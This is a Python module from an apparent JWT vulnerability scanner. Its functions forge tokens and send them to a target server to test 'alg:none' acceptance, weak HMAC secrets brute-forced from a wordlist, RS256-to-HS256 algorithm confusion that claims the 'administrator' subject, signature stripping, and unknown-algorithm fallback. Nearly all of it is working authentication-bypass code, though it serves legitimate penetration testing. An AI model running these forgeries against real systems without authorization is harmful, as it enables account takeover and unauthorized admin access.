import json
import base64
from typing import Dict, Any

from ..enums import _kurtVuln_list
from ..models import jq_vuln_list


def test_none_algorithm(scanner) -> None:
    """Test if server accepts tokens with 'alg:none'"""
    from colorama import Fore, Style

    print(f"\n{Fore.YELLOW}[*] Testing 'none' algorithm...{Style.RESET_ALL}")

    try:
        payload_header = scanner.header.copy()
        payload_header["alg"] = "none"

        encoded_header = (
            base64.urlsafe_b64encode(json.dumps(payload_header).encode())
            .decode()
            .rstrip("=")
        )
        encoded_payload = (
            base64.urlsafe_b64encode(json.dumps(scanner.payload).encode())
            .decode()
            .rstrip("=")
        )
        forged_token = f"{encoded_header}.{encoded_payload}."

        response = scanner.make_request(
            scanner.target_url, forged_token, delay=scanner.delay
        )

        if response.status_code == 200 and "unauthorized" not in response.text.lower():
            vuln = jq_vuln_list(
                type=_kurtVuln_list.NONE_ALGORITHM,
                severity="CRITICAL",
                description="Server accepts tokens with 'alg':'none' (no signature verification)",
                exploit_payload=forged_token,
                proof=f"HTTP {response.status_code} response",
                endpoint=scanner.target_url,
                chainable_with=[_kurtVuln_list.SIGNATURE_REMOVAL],
                cve_reference="CVE-2015-9235",
                cvss_score=9.8,
            )
            scanner.vulnerabilities.append(vuln)
            print(
                f"{Fore.RED}[!] CRITICAL: 'none' algorithm accepted!{Style.RESET_ALL}"
            )
        else:
            print(
                f"{Fore.GREEN}[-] Not vulnerable to 'none' algorithm{Style.RESET_ALL}"
            )
    except Exception as e:
        if scanner.verbose:
            print(f"{Fore.RED}[ERROR] None alg test failed: {e}{Style.RESET_ALL}")


def test_weak_secret(scanner) -> None:
    """Test if JWT uses weak HMAC secret"""
    from colorama import Fore, Style
    import jwt

    print(f"\n{Fore.YELLOW}[*] Testing weak HMAC secrets...{Style.RESET_ALL}")

    alg = scanner.header.get("alg", "")
    if not alg.startswith("HS"):
        print(
            f"{Fore.YELLOW}[-] Token uses asymmetric algorithm, skipping weak secret test{Style.RESET_ALL}"
        )
        return

    secrets_to_try = scanner.weak_secrets.copy()
    if scanner.level.value >= 3:
        for secret in scanner.weak_secrets[:50]:
            secrets_to_try.append(secret.upper())
            secrets_to_try.append(secret.capitalize())
            secrets_to_try.append(secret + "123")
            secrets_to_try.append(secret + "!")

    for secret in secrets_to_try:
        try:
            jwt.decode(scanner.original_token, secret, algorithms=[alg])
            vuln = jq_vuln_list(
                type=_kurtVuln_list.WEAK_SECRET,
                severity="CRITICAL",
                description=f"Weak HMAC secret found: '{secret}'",
                exploit_payload=secret,
                proof="Token successfully decoded with the secret",
                endpoint=scanner.target_url,
                chainable_with=[_kurtVuln_list.ALGORITHM_CONFUSION],
                cve_reference="CVE-2020-28637",
                cvss_score=9.8,
            )
            scanner.vulnerabilities.append(vuln)
            print(f"{Fore.RED}[!] Weak secret found: {secret}{Style.RESET_ALL}")
            return
        except:
            continue

    print(f"{Fore.GREEN}[-] No weak secret found in wordlist{Style.RESET_ALL}")


def test_algorithm_confusion(scanner) -> None:
    """Test algorithm confusion (RS256 -> HS256)"""
    from colorama import Fore, Style
    import jwt

    print(
        f"\n{Fore.YELLOW}[*] Testing algorithm confusion (RS256->HS256)...{Style.RESET_ALL}"
    )

    if scanner.header.get("alg") != "RS256" or not scanner.public_keys:
        if not scanner.public_keys:
            print(
                f"{Fore.YELLOW}[-] No public key available for confusion test{Style.RESET_ALL}"
            )
        return

    for kid, pem in scanner.public_keys.items():
        try:
            payload = scanner.payload.copy()
            payload["sub"] = "administrator"

            forged_token = jwt.encode(
                payload, pem, algorithm="HS256", headers={"kid": kid}
            )
            response = scanner.make_request(
                scanner.target_url, forged_token, delay=scanner.delay
            )

            if response.status_code == 200 and "admin" in response.text.lower():
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.ALGORITHM_CONFUSION,
                    severity="CRITICAL",
                    description="Algorithm confusion possible: server uses public key as HMAC secret",
                    exploit_payload=forged_token,
                    proof=f"Access to admin area with forged token",
                    endpoint=scanner.target_url,
                    chainable_with=[_kurtVuln_list.PUBLIC_KEY_EXPOSURE],
                    cve_reference="CVE-2016-10555, CVE-2024-54150",
                    cvss_score=9.1,
                )
                scanner.vulnerabilities.append(vuln)
                print(f"{Fore.RED}[!] Algorithm confusion successful!{Style.RESET_ALL}")
                return
        except Exception:
            continue

    print(f"{Fore.GREEN}[-] Not vulnerable to algorithm confusion{Style.RESET_ALL}")


def test_signature_removal(scanner) -> None:
    """Test if server accepts tokens with missing signature"""
    from colorama import Fore, Style

    print(f"\n{Fore.YELLOW}[*] Testing signature removal...{Style.RESET_ALL}")

    try:
        parts = scanner.original_token.split(".")
        forged_token = f"{parts[0]}.{parts[1]}."

        response = scanner.make_request(
            scanner.target_url, forged_token, delay=scanner.delay
        )

        if response.status_code == 200 and "unauthorized" not in response.text.lower():
            vuln = jq_vuln_list(
                type=_kurtVuln_list.SIGNATURE_REMOVAL,
                severity="HIGH",
                description="Server accepts tokens with missing signature",
                exploit_payload=forged_token,
                proof=f"HTTP {response.status_code} response",
                endpoint=scanner.target_url,
                chainable_with=[_kurtVuln_list.NONE_ALGORITHM],
                cvss_score=8.2,
            )
            scanner.vulnerabilities.append(vuln)
            print(f"{Fore.RED}[!] Signature removal accepted!{Style.RESET_ALL}")
        else:
            print(
                f"{Fore.GREEN}[-] Not vulnerable to signature removal{Style.RESET_ALL}"
            )
    except Exception as e:
        if scanner.verbose:
            print(
                f"{Fore.RED}[ERROR] Signature removal test failed: {e}{Style.RESET_ALL}"
            )


def test_unknown_algorithm(scanner) -> None:
    """Test unknown algorithm handling"""
    from colorama import Fore, Style
    from ..constants import UNKNOWN_ALG_PAYLOADS

    print(
        f"\n{Fore.YELLOW}[*] Testing unknown algorithm handling (CVE-2026-23993)...{Style.RESET_ALL}"
    )

    for unknown_alg in UNKNOWN_ALG_PAYLOADS:
        try:
            payload_header = scanner.header.copy()
            payload_header["alg"] = unknown_alg

            encoded_header = (
                base64.urlsafe_b64encode(json.dumps(payload_header).encode())
                .decode()
                .rstrip("=")
            )
            parts = scanner.original_token.split(".")
            forged_token = f"{encoded_header}.{parts[1]}."
            response = scanner.make_request(
                scanner.target_url, forged_token, delay=scanner.delay
            )

            if (
                response.status_code == 200
                and "unauthorized" not in response.text.lower()
            ):
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.UNKNOWN_ALG_BYPASS,
                    severity="CRITICAL",
                    description=f"Server accepts unknown algorithm '{unknown_alg}' (possible fallback to none)",
                    exploit_payload=f"alg={unknown_alg}",
                    proof=f"HTTP 200 response",
                    endpoint=scanner.target_url,
                    chainable_with=[_kurtVuln_list.NONE_ALGORITHM],
                    cve_reference="CVE-2026-23993",
                    cvss_score=9.0,
                )
                scanner.vulnerabilities.append(vuln)
                print(
                    f"{Fore.RED}[!] Unknown algorithm '{unknown_alg}' accepted!{Style.RESET_ALL}"
                )
                return
        except Exception:
            continue

    for unknown_alg in UNKNOWN_ALG_PAYLOADS:
        try:
            payload_header = scanner.header.copy()
            payload_header["alg"] = unknown_alg
            encoded_header = (
                base64.urlsafe_b64encode(json.dumps(payload_header).encode())
                .decode()
                .rstrip("=")
            )
            parts = scanner.original_token.split(".")
            forged_token = f"{encoded_header}.{parts[1]}.{parts[2]}"
            response = scanner.make_request(
                scanner.target_url, forged_token, delay=scanner.delay
            )
            if "algorithm" in response.text.lower() or "alg" in response.text.lower():
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.UNKNOWN_ALG_BYPASS,
                    severity="LOW",
                    description="Server discloses algorithm information in error messages",
                    exploit_payload=f"alg={unknown_alg}",
                    proof=response.text[:200],
                    endpoint=scanner.target_url,
                    cvss_score=3.0,
                )
                scanner.vulnerabilities.append(vuln)
                print(
                    f"{Fore.YELLOW}[!] Server discloses algorithm information{Style.RESET_ALL}"
                )
                return
        except:
            continue

    print(f"{Fore.GREEN}[-] Unknown algorithm properly rejected{Style.RESET_ALL}")
